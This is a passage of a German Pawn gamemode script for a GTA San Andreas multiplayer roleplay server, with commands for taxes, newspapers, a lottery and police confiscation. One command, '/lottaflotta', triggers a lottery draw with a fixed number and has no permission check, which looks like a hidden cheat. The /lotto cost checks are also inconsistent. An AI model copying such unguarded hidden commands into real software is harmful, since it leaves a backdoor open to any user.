			format(string, sizeof(string), "** IRC %s: %s. **", sendername, result);
			SendIRCMessage(PlayersChannel[playerid], COLOR_YELLOW2, string);
	    }
	    return 1;
	}
	if(strcmp(cmd,"/settax",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pLeader] != 7)
	        {
				SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Mitglied der Regierung!");
				return 1;
	        }
	        tmp = strtoknew(cmdtext, idx);
	        if(!strlen(tmp)) {
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: /settax [Betrag]");
				return 1;
			}
			moneys = strval(tmp);
			if(moneys < 1 || moneys > 5000) { SendClientMessage(playerid, COLOR_GREY, "   Steuern müssen zwischen 1 und 5000 sein !"); return 1; }
			new taxram = Tax;
			Tax = moneys;
			SaveStuff();
			format(string, sizeof(string), "* Die Steuern wurden auf $%d pro Spieler geändert.", Tax);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* Die Steuern wurden von Präsident %s von %d$ auf %d$ geändert!", GetName(playerid),taxram,Tax);
			SanNewsMsg(string);

	    }
	    return 1;
	}
	if(strcmp(cmd,"/givetax",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pLeader] != 7)
	        {
				SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Mitglied der Regierung!");
				return 1;
	        }
	        if(Tax < 1)
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Staatskasse ist Leer! !");
				return 1;
			}
			new Cops = 0;
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(IsPlayerConnected(i))
			    {
			        if(gTeam[i] == 2 && PlayerInfo[i][pMember] == 1)
			        {
			            Cops += 1;
			        }
			    }
			}
			if(Cops >= 1)
			{
			    new value = Tax / 2;
			    new price = value / Cops;
			    for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i))
				    {
				        if(gTeam[i] == 2 && PlayerInfo[i][pMember] == 1)
				        {
				            format(string, sizeof(string), "* Du hast vom Presidenten $%d bekommen ( Steuern ).",price);
							SendClientMessage(i, COLOR_LIGHTBLUE, string);
							GivePlayerMoneySave(i, price);
							Tax -= price;
				        }
				    }
				}
				SaveStuff();
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Im moment sind keine Polizisten online !");
				return 1;
			}
		}
		return 1;
	}
	if(strcmp(cmd,"/read",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
			new x_job[256];
			x_job = strtoknew(cmdtext, idx);
			if(!strlen(x_job)) {
				SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /read [name]");
				SendClientMessage(playerid, COLOR_GREY, "Verfügbare namen: Paper, TestPaper");
				return 1;
			}
	        if(strcmp(x_job,"paper",true) == 0)
			{
			    if(GotPaper[playerid] > 0)
			    {
			        SendClientMessage(playerid, COLOR_WHITE, "|_______________ GTA-City Reallife  _______________|");
			        format(string, sizeof(string), "| %s  |  By News Reporter: %s.",Paper[playerid][pTitle],Paper[playerid][pMaker]);
			        SendClientMessage(playerid, COLOR_GREEN, string);
			        format(string, sizeof(string), "%s",Paper[playerid][pLine1]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",Paper[playerid][pLine2]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",Paper[playerid][pLine3]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",Paper[playerid][pLine4]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",Paper[playerid][pLine5]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",Paper[playerid][pLine6]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",Paper[playerid][pLine7]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________________________________|");
			        return 1;
			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_GREY, "Du hast keine Zeitung !");
			        return 1;
			    }
			}
			else if(strcmp(x_job,"testpaper",true) == 0)
			{
			    if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
			    {
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /read testpaper [papernr]");
						return 1;
					}
					new paper = strval(tmp);
					if(paper < 1 || paper > 10) { SendClientMessage(playerid, COLOR_GREY, "   Zeitungsnummer nicht weniger als 1 oder höher als 10 !"); return 1; }
					paper -= 1;
					if(PaperInfo[paper][PaperUsed] == 0)
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Unter dieser Nummer gibt es keine Zeitung !");
					    return 1;
					}
			        SendClientMessage(playerid, COLOR_WHITE, "|_______________  GTA-City Reallife _______________|");
			        format(string, sizeof(string), "| %s  |  By News Reporter: %s.",PaperInfo[paper][PaperTitle],PaperInfo[paper][PaperMaker]);
			        SendClientMessage(playerid, COLOR_GREEN, string);
			        format(string, sizeof(string), "%s",PaperInfo[paper][PaperText1]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",PaperInfo[paper][PaperText2]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",PaperInfo[paper][PaperText3]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",PaperInfo[paper][PaperText4]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",PaperInfo[paper][PaperText5]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",PaperInfo[paper][PaperText6]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        format(string, sizeof(string), "%s",PaperInfo[paper][PaperText7]);
			        SendClientMessage(playerid, COLOR_GREY, string);
			        SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________________________________|");
			        return 1;
				}
				else
				{
        			SendClientMessage(playerid, COLOR_GREY, "   Du bist kein News Reporter !");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /read testpaper [papernr]");
				return 1;
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/papers", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9 || PlayerInfo[playerid][pJob] == 15)
	        {
				if(IsPlayerInRangeOfPoint(playerid,20.0,252.8250,1780.5929,701.0859))
				{
				    new number = 0;
				    for(new i = 0; i < sizeof(PaperInfo); i++)
				    {
				        number ++;
				        if(PaperInfo[i][PaperUsed] == 1)
				    	{
				        	format(string, sizeof(string), "|%d| Zeitung: %s, Von: %s",number,PaperInfo[i][PaperTitle],PaperInfo[i][PaperMaker]);
							SendClientMessage(playerid, COLOR_WHITE, string);
						}
				    }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "  Du bist nicht am Redaktionsgebäude !");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Member der San News !");
	            return 1;
			}
	    }
	    return 1;
	}
	if(strcmp(cmd, "/paper", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
	        {
	            if(!IsPlayerInRangeOfPoint(playerid,3.0,252.8250,1780.5929,701.0859))
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht am Redaktionsgebäude !");
				    return 1;
				}
				new x_nr[256];
				x_nr = strtoknew(cmdtext, idx);
				if(!strlen(x_nr)) {
					SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /paper write [papernr] oder /paper delete [papernr]");
				    return 1;
				}
			    if(strcmp(x_nr,"write",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
				    if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /paper write [Nummer]");
					    return 1;
					}
					new paper = strval(tmp);
					if(paper < 1 || paper > 10) { SendClientMessage(playerid, COLOR_GREY, "   Die Zeitungsnummer darf nicht unter 1 oder über 10 liegen !"); return 1; }
					paper -= 1;
					if(PaperInfo[paper][PaperUsed] == 1)
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Unter dieser Nummer gibt es schon eine Zeitung !");
					    return 1;
					}
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Du hast eine neue Zeitung erstellt..");
					SendClientMessage(playerid, COLOR_LIGHTRED, "* Alles was du jetzt schreibst steht hinterher in der Zeitung, dir stehen 7 Reihen zur Verfügung.");
					SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte gib den Titel deiner Zeitung an.");
					WritingPaper[playerid] = 1;
					WritingPaperNumber[playerid] = paper;
					WritingLine[playerid] = 1;
				}
				else if(strcmp(x_nr,"delete",true) == 0)
				{
				    if(PlayerInfo[playerid][pRank] >= 4)
				    {
				        tmp = strtoknew(cmdtext, idx);
					    if(!strlen(tmp))
						{
						    SendClientMessage(playerid, COLOR_WHITE, "BENUTZUNG: /paper delete [papernr]");
						    return 1;
						}
						new paper = strval(tmp);
						if(paper < 1 || paper > 10) { SendClientMessage(playerid, COLOR_GREY, "   Die Zeitungsnummer darf nicht unter 1 oder über 10 liegen !"); /*return 1 !");*/ return 1; }
						paper -= 1;
						ClearPaper(paper);
						new number = paper; number += 1;
						format(string, sizeof(string), "Gelöschte Zeitung %d.",number);
						SendClientMessage(playerid, COLOR_YELLOW, string);
				    }
				    else
				    {
				        SendClientMessage(playerid, COLOR_GREY, "   Du mußt Rang 4 haben um Zeitungen zu löschen !");
				        return 1;
				    }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /paper write [papernr] oder /paper delete [papernr]");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein News Reporter !");
	            return 1;
			}
	    }
	    return 1;
	}








	if(strcmp(cmd, "/lottaflotta", true) == 0)
	{
		Lotto(23);
	    return 1;
	}


	if(strcmp(cmd, "/lotto", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pLottoNr] > 0)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du hast bereits ein Lotterielos !");
	            return 1;
	        }
	        if(GetPlayerMoneySave(playerid) < 50)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du brauchst $1500 um ein Lotterielos kaufen zu können !");
	            return 1;
	        }
	        tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp)) {
				SendClientMessage(playerid, COLOR_WHITE,"Benutze: /lotto [nummer]");
				return 1;
			}
			new lottonr = strval(tmp);
			if(lottonr < 1 || lottonr > 300) { SendClientMessage(playerid, COLOR_GREY, "Deine Lotterienummer darf nicht unter 1 oder über 300 liegen!"); return 1; }   // max is 180 xdddddddddddd
			format(string, sizeof(string), "* Du hast dir ein Lotterielos mit der Nummer: %d gekauft, Viel Glück.", lottonr);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			FraktionsKasse[6] += 5000;
			GivePlayerMoneySave(playerid, - 5000);
			Jackpot += 5000;
			PlayerInfo[playerid][pLottoNr] = lottonr;
	    }
	    return 1;
	}

	if(strcmp(cmd, "/take", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gTeam[playerid] == 2 || IsACop(playerid))
	        {
	            if(PlayerInfo[playerid][pRank] < 1)
	            {
	                SendClientMessage(playerid, COLOR_GREY, "   Du brauchst Rang 2 oder höher um diese Aktion durch zu führen !");
	                return 1;
	            }
	            if(IsPlayerInAnyVehicle(playerid))
	            {
	            	SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist in einem Auto !");
	                return 1;
			    }
	            new x_nr[256];
				x_nr = strtoknew(cmdtext, idx);
				if(!strlen(x_nr)) {
					SendClientMessage(playerid, COLOR_WHITE, "|__________________ Entzug von Gegenständen __________________|");
					SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /take [Gegenstand] [Spieler ID]");
                    SendClientMessage(playerid, COLOR_GRAD1, "Verfügbare Gegenstände: Driverslicense, Flyinglicense, Boatlicense, Gunlicense, Roller");
                    SendClientMessage(playerid, COLOR_GRAD1, "Verfügbare Gegenstände: Waffen, Drogen, Materials, TDrogen, TMaterials");
					SendClientMessage(playerid, COLOR_WHITE, "|___________________________________________________|");
					return 1;
				}
			    if(strcmp(x_nr,"driverslicense",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /take driverslicense [playerid/PartOfName]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if (ProxDetectorS(8.0, playerid, giveplayerid))
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
						        format(string, sizeof(string), "* Du hast %s den Führerschein entzogen.", giveplayer);
						        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						        format(string, sizeof(string), "* Officer %s hat dir den Führerschein entzogen.", sendername);
						        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						        PlayerInfo[giveplayerid][pCarLic] = 0;
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner Nähe !");
							    return 1;
							}
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"flyinglicense",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take flyinglicense [spielerid]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if (ProxDetectorS(8.0, playerid, giveplayerid))
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
						        format(string, sizeof(string), "* Du hast %s die Fluglizenz entzogen.", giveplayer);
						        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						        format(string, sizeof(string), "* Officer %s hat dir deine Fluglizenz entzogen.", sendername);
						        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						        PlayerInfo[giveplayerid][pFlyLic] = 0;
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner Nähe !");
							    return 1;
							}
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"Roller",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take flyinglicense [spielerid]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if (ProxDetectorS(8.0, playerid, giveplayerid))
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
						        format(string, sizeof(string), "* Du hast %s deinen Rollerschein entzogen.", giveplayer);
						        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						        format(string, sizeof(string), "* Officer %s hat dir deinen Rollerschein entzogen.", sendername);
						        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						        PlayerInfo[giveplayerid][pRollerLic] = 0;
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner Nähe !");
							    return 1;
							}
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"gunlicense",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take driverslicense [spielerid]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if (ProxDetectorS(8.0, playerid, giveplayerid))
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
						        format(string, sizeof(string), "* Du hast %s's den Waffenschein abgenommen.", giveplayer);
						        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						        format(string, sizeof(string), "* Officer %s hat dir deinen Waffenschein abgenommen.", sendername);
						        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						        PlayerInfo[giveplayerid][pGunLic] = 0;
					        }
					        else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht nah genug !");
							    return 1;
							}
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"boatlicense",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take boatlicense [playerid]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if (ProxDetectorS(8.0, playerid, giveplayerid))
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
						        format(string, sizeof(string), "* Du hast %s's die Bootlizenz abgenommen.", giveplayer);
						        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						        format(string, sizeof(string), "* Officer %s hat dir deine Bootlizenz abgenommen.", sendername);
						        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						        PlayerInfo[giveplayerid][pBoatLic] = 0;
					        }
					        else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht nah genug !");
							    return 1;
							}
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"waffen",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take waffen [playerid]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
							//new Erfolg = 0;
							//new chealth;
							//GetPlayerHealth(chealth,playerid);
							//new Zufall = ((Erfolg+chealth)+random(5));
					        new Float:health;
						    GetPlayerHealth(playerid, health);
							new Float:Zufall=health-random(50);
							if(Zufall >= 15)
					    	{
					        	if (ProxDetectorS(8.0, playerid, giveplayerid))
								{
									GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
									GetPlayerName(playerid, sendername, sizeof(sendername));
						    	    format(string, sizeof(string), "* Du hast %s's die Waffen abgenommen.", giveplayer);
						    	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						    	    format(string, sizeof(string), "* Officer %s hat dir deine Waffen abgenommen.", sendername);
						    	    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						    	    ResetPlayerWeapons(giveplayerid);
						    	    PlayerInfo[giveplayerid][pGun1] = 0; PlayerInfo[giveplayerid][pAmmo1] = 0;
						    	    PlayerInfo[giveplayerid][pGun2] = 0; PlayerInfo[giveplayerid][pAmmo2] = 0;
						    	    PlayerInfo[giveplayerid][pGun3] = 0; PlayerInfo[giveplayerid][pAmmo3] = 0;
						    	    PlayerInfo[giveplayerid][pGun4] = 0; PlayerInfo[giveplayerid][pAmmo4] = 0;
					        	}
					        	else
								{
								    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht nah genug !");
								    return 1;
								}
							}
       						else
							{
							   SendClientMessage(playerid, COLOR_GREY, "Waffen abnehmen Fehlgeschlagen!");
							   return 1;
							}
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"tdrogen", true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
				    if(!strlen(tmp)) {
				        SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /take tdrogen [Spieler ID]");
				        return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if (ProxDetectorS(8.0, playerid, giveplayerid))
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
							    format(string, sizeof(string), "* Du hast %s's Taschen-Drogen abgenommen.", giveplayer);
						        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						        format(string, sizeof(string), "* Officer %s hat dir deine Taschen-Drogen abgenommen.", sendername);
						        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						        PlayerInfo[giveplayerid][pInvDrugs] = 0;
							}
					        else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht nah genug !");
							    return 1;
							}
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist nicht online!");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"tmaterials", true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
				    if(!strlen(tmp)) {
				        SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /take tmaterials [Spieler ID]");
				        return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if (ProxDetectorS(8.0, playerid, giveplayerid))
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
							    format(string, sizeof(string), "* Du hast %s's Taschen-Materials abgenommen.", giveplayer);
						        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						        format(string, sizeof(string), "* Officer %s hat dir deine Taschen-Materials abgenommen.", sendername);
						        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						        PlayerInfo[giveplayerid][pInvMats] = 0;
							}
					        else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht nah genug !");
							    return 1;
							}
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist nicht online!");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"drogen",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /take drogen [playerid/PartOfName]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if (ProxDetectorS(8.0, playerid, giveplayerid))
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
							    format(string, sizeof(string), "* Du hast %s's Drogen abgenommen.", giveplayer);
						        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						        format(string, sizeof(string), "* Officer %s hat dir deine Drogen abgenommen.", sendername);
						        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						        PlayerInfo[giveplayerid][pDrugs] = 0;
							}
					        else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht nah genug !");
							    return 1;
							}
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"materials",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take materials [playerid/PartOfName]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if (ProxDetectorS(8.0, playerid, giveplayerid))
							{
								GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
							    format(string, sizeof(string), "* Du hast %s's Materialien abgenommen .", giveplayer);
						        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						        format(string, sizeof(string), "* Officer %s hat dir deine Materialien abgenommen.", sendername);
						        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						        PlayerInfo[giveplayerid][pMats] = 0;
							}
					        else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht nah genug !");
							    return 1;
							}
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "   Ungenauer Name !");
					return 1;
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein COP !");
	            return 1;
	        }
	    }
	    return 1;
	}
	if(strcmp(cmd, "/atake", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] >= 1)
	        {
	            new x_nr[256];
				x_nr = strtoknew(cmdtext, idx);
				if(!strlen(x_nr)) {
					SendClientMessage(playerid, COLOR_WHITE, "|__________________ Entzug von Lizenzen __________________|");
					SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /take [licensename] [spielerid/PartOfName]");
                    SendClientMessage(playerid, COLOR_GREY, "Available names: Driverslicense, Flyinglicense, Boatlicense, Gunlicense, Weapons, Drugs, Materials");
					SendClientMessage(playerid, COLOR_WHITE, "|___________________________________________________|");
					return 1;
				}
			    if(strcmp(x_nr,"driverslicense",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /take driverslicense [playerid/PartOfName]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
					        format(string, sizeof(string), "* Du hast %s den Führerschein entzogen.", giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Admin %s hat dir den Führerschein entzogen.", sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pCarLic] = 0;
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"flyinglicense",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take flyinglicense [spielerid]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
					        format(string, sizeof(string), "* Du hast %s den Motorradführerschein entzogen.", giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Admin %s hat dir den Motorradführerschein entzogen.", sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pFlyLic] = 0;
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"gunlicense",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take driverslicense [spielerid]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
					        format(string, sizeof(string), "* Du hast %s's Die Waffen License abgenommen.", giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Admin %s hat dir deine Waffen License abgenommen.", sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pGunLic] = 0;
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"boatlicense",true) == 0)
				{
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp)) {
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /take boatlicense [playerid]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
